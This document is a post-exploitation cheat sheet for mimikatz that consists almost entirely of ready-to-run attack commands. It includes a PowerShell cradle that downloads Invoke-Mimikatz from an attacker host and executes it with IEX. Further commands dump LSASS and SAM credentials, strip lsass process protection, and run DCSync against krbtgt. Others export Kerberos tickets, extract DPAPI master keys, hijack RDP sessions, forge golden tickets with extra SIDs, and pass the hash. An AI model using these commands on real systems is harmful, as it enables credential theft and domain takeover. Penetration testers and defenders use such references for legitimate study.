# mimikatz

% mimikatz, passwords

## powershell - load mimikatz
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX
Invoke mimikatz
```

## mimikatz onliner
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "exit"
```
## mimikatz disable PPL and dump passwords
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords /all" "exit"
```

## mimikatz - vault - Get passwords of scheduled tasks
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

## mimikatz - dcsync - user (krbtgt/Administrator)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
```

## mimikatz - extract credentials from dump
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords /all" "exit"
```

## mimikatz - extract credentials from shadow copy (1)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
```

## mimikatz - extract credentials from shadow copy (2)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER

Extract old passwords
```
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY"
```

## extract - on hand shadow volume copy
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.bkp')"
```

% mimikatz, tickets

## mimikatz - tickets - list
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
sekurksa::tickets
```

## mimikatz - tickets - extract 
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
sekurlsa::tickets /export
```

% mimikatz, dpapi, credman


## mimikatz - credman - List Credentials Manager
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
sekurlsa::Credman
```


## mimikatz - dpapi - check the file to get guidMasterKey
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

Seatbelt come in handy for enumerating credential blob files' location
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\

```
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile>
```

## mimikatz - dpapi - find master key
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
$ mimikatz !sekurlsa::dpapi
```

## mimikatz - dpapi - use master key
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

sid : origin domain sid : Get-DomainSID -Domain domainname
sid : origin domain sid : Get-DomainSID -Domain domainname
```
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile> /masterkey:<masterkey>
```

## mimikatz - dpapi - Extract masterkey Administrator
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
mimikatz sekurlsa::dpapi
```


## mimikatz - dpapi - Extract masterkey with password
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /sid:<SID> /password:<password> /protected
```

## mimikatz - dpapi - Extract masterkey AD
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /rpc
```



% mimikatz, rdp

## mimikatz - rdp - List sessions 
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
ts::sessions
```

## mimikatz - rdp - Hijack session 
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
ts::remote /id:<id>
```

## mimikatz - rdp - Extract passwords
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
ts::logonpasswords
```


% mimikatz, ad


## mimikatz - forest extra SID
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

sid : origin domain sid : Get-DomainSID -Domain domainname
sids :  ExtraSid value (Enterprise Admins SID) : parent SID
	
```powershell
kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
```

% mimikatz, pth
## mimikatz pth to RDP mstsc.exe
#plateform/windows  #target/local  #cat/PIVOT 
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```

## mimikatz pth run powershell remotelly
#plateform/windows  #target/local  #cat/PIVOT 
Followed by : Enter-PSSession -Computer {<}computer_name}
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
```